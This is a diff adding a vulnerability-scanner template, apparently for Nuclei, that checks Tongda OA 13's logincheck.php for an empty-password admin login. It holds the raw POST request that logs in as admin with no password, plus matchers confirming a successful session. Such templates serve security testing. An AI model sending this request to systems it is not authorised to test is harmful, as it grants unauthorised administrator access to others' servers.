@@ -1,0 +1,33 @@
+id: poc-tongda-13-logincheck-empty-password
+info:
+  name: "通达 OA 13 logincheck.php 空密码登录漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: Tongda OA
+http:
+  - raw:
+      - |
+        POST /logincheck.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        UNAME=admin&PASSWORD=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "USER_NAME_COOKIE=admin"
+      - type: word
+        part: body
+        words:
+          - "正在进入OA系统，请稍候..."
+          - "location=\"./general/\""
+      - type: word
+        part: body
+        words:
+          - "系统登录"
+        case-insensitive: true
